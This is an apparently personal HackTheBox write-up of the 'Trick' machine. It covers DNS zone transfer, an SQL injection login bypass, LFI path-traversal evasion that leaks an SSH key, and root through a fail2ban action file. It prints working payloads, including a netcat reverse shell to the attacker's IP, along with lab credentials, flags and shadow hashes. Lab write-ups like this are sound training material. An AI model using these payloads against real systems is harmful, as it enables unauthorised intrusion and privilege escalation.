---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags:
  - LFI
  - dns-enumeration
  - dns-zone-transfer
  - evasion
  - fail2ban
  - privesc/fail2ban
  - Linux
---
![Trick.png](../../zzz_res/attachments/Trick.png)

***TABLE OF CONTENTS:***

---

# Resolution summary

>[!summary]
>- DNS zone-transfer and DNS enumeration allows to identify different sub-domains, one of which vulnerable to LFI
>- Evading the WAF and exploiting the LFI permits to leak user’s ssh private key
>- User can create files inside fail2ban’s action.d/ folder and restart the service. It is possible to inject a custom .local file that will be evaluated during the ban and execute code with high privileges

## Improved skills

- Exploit DNS zone transfer and perform deep DNS enumeration
- Exploit writable action.d directory to escalate privileges using fail2ban

## Used tools

- nmap
- gobuster
- ffuf
- dig


---

# Information Gathering

Scanned all TCP ports:

```
$ sudo nmap -p- 10.10.11.166 -sS -oA scan/all-tcp-ports -v
...
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
```

Enumerated open TCP ports:

```
$ sudo nmap -sV -sC -sT 10.10.11.166 -oA scan/open-tcp-ports -p22,25,53,80
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 15:52 EDT
Nmap scan report for 10.10.11.166
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated top 200 UDP ports:

```bash
$ sudo nmap -sU --top-ports 200 -oA scan/open-udp-ports 10.10.11.166
[sudo] password for kali:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 15:53 EDT
Nmap scan report for 10.10.11.166
Host is up (0.040s latency).
Not shown: 196 closed udp ports (port-unreach)
PORT     STATE         SERVICE
53/udp   open          domain
68/udp   open|filtered dhcpc
631/udp  open|filtered ipp
5353/udp open|filtered zeroconf
```

# Enumeration

## Port 25 - SMTP (Postfix smtpd)

VRFY user enumeration is allowed:

```
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Trick]
└─$ nc -nvvvC 10.10.11.166 25
(UNKNOWN) [10.10.11.166] 25 (smtp) open
220 debian.localdomain ESMTP Postfix (Debian/GNU)
EHLO SERVER
250-debian.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
VRFY test
550 5.1.1 <test>: Recipient address rejected: User unknown in local recipient table
VRFY root
252 2.0.0 root
quit
221 2.0.0 Bye
 sent 37, rcvd 336
```

## Port 53 - DNS (BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux))

DNS enumeration:

```
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Trick]
└─$ dig ANY @10.10.11.166 trick.htb

; <<>> DiG 9.18.1-1-Debian <<>> ANY @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 30438
;; flags: qr aa rd; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 788e30d8f5b78cd9c6ac367f62c3487a02404f061b80db7e (good)
;; QUESTION SECTION:
;trick.htb.                     IN      ANY

;; ANSWER SECTION:
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 36 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Mon Jul 04 16:07:21 EDT 2022
;; MSG SIZE  rcvd: 209
```

Zone transfer on trick.htb:

```
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Trick]
└─$ dig axfr @10.10.11.166

; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.11.166
; (1 server found)
;; global options: +cmd
;; Query time: 35 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
;; WHEN: Mon Jul 04 16:05:24 EDT 2022
;; MSG SIZE  rcvd: 56

┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Trick]
└─$ dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 36 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Mon Jul 04 16:05:43 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

Subdomain enumeration:

```
$ gobuster dns -d trick.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
...
Found: root.trick.htb
===============================================================
2022/07/04 16:48:10 Finished
===============================================================

$ ffuf -u http://10.10.11.166 -H 'Host: preprod-FUZZ.trick.htb'  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 1697
...
marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 37ms]
payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 39ms]
```

## Port 80 - HTTP (nginx 1.14.2)

Browsed port 80:

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196.png)

Enumerated files and directories:

```
$ gobuster dir -u http://10.10.11.166  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -o scan/10.10.11.166-dir.txt -f
...
/js/                  (Status: 403) [Size: 169]
/css/                 (Status: 403) [Size: 169]
/assets/              (Status: 403) [Size: 169]

$ gobuster dir -u http://10.10.11.166  -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o scan/10.10.11.166-files.txt -f
...
/./                   (Status: 200) [Size: 5480]
```

### root.trick.htb

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%201.png)

### preprod-payroll.trick.htb

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%202.png)

SQL Injection bypass: `' OR '1'='1' -- -`

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%203.png)

Enumerated usernames and password:

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%204.png)

>[!important]
>Enemigosss     SuperGucciRainbowCake

Enumerated all pages:

```
$ ffuf -u http://preprod-payroll.trick.htb/index.php?page=FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -b 'PHPSESSID=cf656rluc92b6h9a4tb8oom37m' -fw 1281
...
 :: Method           : GET
 :: URL              : http://preprod-payroll.trick.htb/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Header           : Cookie: PHPSESSID=cf656rluc92b6h9a4tb8oom37m
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1281
...
index                   [Status: 200, Size: 15748, Words: 1145, Lines: 360, Duration: 38ms]
login                   [Status: 200, Size: 14791, Words: 1654, Lines: 419, Duration: 43ms]
home                    [Status: 200, Size: 9718, Words: 1460, Lines: 269, Duration: 36ms]
users                   [Status: 200, Size: 11417, Words: 1383, Lines: 323, Duration: 36ms]
header                  [Status: 200, Size: 11769, Words: 1425, Lines: 288, Duration: 36ms]
employee                [Status: 200, Size: 47783, Words: 2828, Lines: 1118, Duration: 38ms]
navbar                  [Status: 200, Size: 10751, Words: 1355, Lines: 268, Duration: 35ms]
department              [Status: 200, Size: 14069, Words: 1524, Lines: 421, Duration: 38ms]
payroll                 [Status: 200, Size: 12364, Words: 1366, Lines: 353, Duration: 56ms]
position                [Status: 200, Size: 14772, Words: 1540, Lines: 438, Duration: 37ms]
topbar                  [Status: 200, Size: 9819, Words: 1353, Lines: 262, Duration: 37ms]
attendance              [Status: 200, Size: 13913, Words: 1432, Lines: 414, Duration: 44ms]
site_settings           [Status: 200, Size: 11501, Words: 1433, Lines: 327, Duration: 39ms]
:: Progress: [63087/63087] :: Job [1/1] :: 899 req/sec :: Duration: [0:01:10] :: Errors: 0 ::
```

![site_settings](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%205.png)

site_settings

![site_settings error after submit](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%206.png)

site_settings error after submit

Enumerated ajax.php actions:

```
$ ffuf -u http://preprod-payroll.trick.htb/ajax.php?action=FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -b 'PHPSESSID=cf656rluc92b6h9a4tb8oom37m' -fw 1
... 
:: Method           : GET
 :: URL              : http://preprod-payroll.trick.htb/ajax.php?action=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Header           : Cookie: PHPSESSID=cf656rluc92b6h9a4tb8oom37m
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
...
login                   [Status: 200, Size: 239, Words: 23, Lines: 5, Duration: 46ms]
signup                  [Status: 200, Size: 702, Words: 67, Lines: 13, Duration: 38ms]
login2                  [Status: 200, Size: 236, Words: 23, Lines: 5, Duration: 39ms]
delete_user             [Status: 200, Size: 215, Words: 23, Lines: 6, Duration: 35ms]
```

### preprod-marketing.trick.htb

Browsed the site:

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%207.png)

Pages are visited through the following URL: `http://preprod-marketing.trick.htb/index.php?page=contact.html`

Enumerated available pages:

```
$ ffuf -u http://preprod-marketing.trick.htb/index.php?page=FUZZ.html -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -fw 1
...
contact                 [Status: 200, Size: 7677, Words: 2554, Lines: 145, Duration: 39ms]
home                    [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 38ms]
about                   [Status: 200, Size: 13272, Words: 4709, Lines: 243, Duration: 38ms]
services                [Status: 200, Size: 10757, Words: 3505, Lines: 193, Duration: 37ms]

$ ffuf -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -fw 1
...
index.php               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 36ms]
contact.html            [Status: 200, Size: 7677, Words: 2554, Lines: 145, Duration: 37ms]
home.html               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 35ms]
about.html              [Status: 200, Size: 13272, Words: 4709, Lines: 243, Duration: 36ms]
services.html           [Status: 200, Size: 10757, Words: 3505, Lines: 193, Duration: 35ms]
```

### Path Traversal

Tried a basic path traversal:

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%208.png)

Tried a double slash path traversal:

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%209.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

# Exploitation

## Local File Inclusion

PHP code is not showed inside the page but instead is executed, meaning that PHP code can be included:

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%2010.png)

Leaked user’s SSH private key:

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%2011.png)

Logged in using michael’s SSH key:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Trick/loot]
└─$ echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----' > michael

┌──(kali㉿kali)-[~/…/HTB/B2R/Trick/loot]
└─$ chmod 600 michael; ssh michael@trick.htb -i michael
The authenticity of host 'trick.htb (10.10.11.166)' can't be established.
ED25519 key fingerprint is SHA256:CUKzxire1i5wxTO1zNuBswEtE0u/RyyjZ+v07fOUuYY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'trick.htb' (ED25519) to the list of known hosts.
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul  4 22:35:41 2022 from 10.10.14.128
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:/etc/fail2ban$ cat ~/user.txt
780ff6978af3c93275156629a9c0562d
```

### Vulnerable code

```php
-bash-5.0$ cat index.php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
```

# Privilege Escalation

## Local enumeration

Enumerated user information:

```
michael@trick:/etc/fail2ban$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

Enumerated sudo capabilities:

```
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Enumerated fail2ban:

```
michael@trick:~$ fail2ban-client  -V
Fail2Ban v0.10.2

Copyright (c) 2004-2008 Cyril Jaquier, 2008- Fail2Ban Contributors
Copyright of modifications held by their respective authors.
Licensed under the GNU General Public License v2 (GPL).

michael@trick:/etc/fail2ban/action.d$ ps -aux | grep root | grep -v '\[' | grep fail
root       2304  0.0  1.0 250992 21812 ?        Ssl  22:58   0:01 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

Enumerated fail2ban configurations:

```
michael@trick:~$ find /etc/fail2ban/ -writable
/etc/fail2ban/action.d

michael@trick:/etc/fail2ban$ ls -al
total 76
drwxr-xr-x   6 root root      4096 Jul  4 23:15 .
drwxr-xr-x 126 root root     12288 Jul  4 22:26 ..
drwxrwx---   2 root security  4096 Jul  4 23:15 action.d
-rw-r--r--   1 root root      2334 Jul  4 23:15 fail2ban.conf
drwxr-xr-x   2 root root      4096 Jul  4 23:15 fail2ban.d
drwxr-xr-x   3 root root      4096 Jul  4 23:15 filter.d
-rw-r--r--   1 root root     22908 Jul  4 23:15 jail.conf
drwxr-xr-x   2 root root      4096 Jul  4 23:15 jail.d
-rw-r--r--   1 root root       645 Jul  4 23:15 paths-arch.conf
-rw-r--r--   1 root root      2827 Jul  4 23:15 paths-common.conf
-rw-r--r--   1 root root       573 Jul  4 23:15 paths-debian.conf
-rw-r--r--   1 root root       738 Jul  4 23:15 paths-opensuse.conf
```

## Remote Code Execution through fail2ban action files

From the official documentation of fail2ban: [MANUAL 0 8](https://www.fail2ban.org/wiki/index.php/MANUAL_0_8)

> **Every .conf file can be overridden with a file named .local.** The .conf file is read first, then .local, with later settings overriding earlier ones. Thus, a .local file doesn't have to include everything in the corresponding .conf file, only those settings that you wish to override.> 

Since we have write access to the action.d/ directory, we can inject a malicious .local file containing our custom code that will be execute with high privileges.

Similar PoC: [Privilege Escalation via fail2ban](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)

Overwrote the iptables-multiport.conf file with a custom .local one and restarted the server to activate new rules:

```
michael@trick:/etc/fail2ban$ cp /etc/fail2ban/action.d/iptables-multiport.conf /dev/shm/iptables-multiport.local
michael@trick:/etc/fail2ban$ /dev/shm/iptables-multiport.local
...
actionban = nc 10.10.14.142 10099 -e /bin/bash
actionunban = nc 10.10.14.142 10099 -e /bin/bash

[Init]
name = default
port = ssh
protocol = tcp
chain = INPUT

michael@trick:/etc/fail2ban$ cp /dev/shm/iptables-multiport.local action.d/iptables-multiport.local
michael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

Get banned and obtained the reverse shell:

```
┌──(kali㉿kali)-[~/…/HTB/B2R/Trick/loot]
└─$ ssh michael@trick.htb
michael@trick.htb's password:
Permission denied, please try again.
michael@trick.htb's password:
Permission denied, please try again.
michael@trick.htb's password:
michael@trick.htb: Permission denied (publickey,password).
...

┌──(kali㉿kali)-[~/…/HTB/B2R/Trick/loot]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.142] from (UNKNOWN) [10.10.11.166] 47804
id
uid=0(root) gid=0(root) groups=0(root)
/bin/bash
cat /root/root.txt
2631e8cadf4fb761541a8dc00810e01b
```

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%2012.png)

# Trophy

![Trick%2041aab3b0eaf94cfcb78db8d45d297196](../../zzz_res/attachments/Trick%2041aab3b0eaf94cfcb78db8d45d297196%2013.png)

>[!success]
>**User.txt**
>780ff6978af3c93275156629a9c0562d

>[!success]
>**Root.txt**
>2631e8cadf4fb761541a8dc00810e01b

**/etc/shadow**

```bash
cat /etc/shadow | grep '\$'
root:$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI/FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::
michael:$6$SPev7eFL5z0aKFf0$5iLTl9egsGGePEPUnNJlFyw8HHvTwqVC3/THKzW2YD5ZPnbkN7pSOeOkXe9uiUHfOJegJdYT0j3Z9pz.FSX2y0:19104:0:99999:7:::
```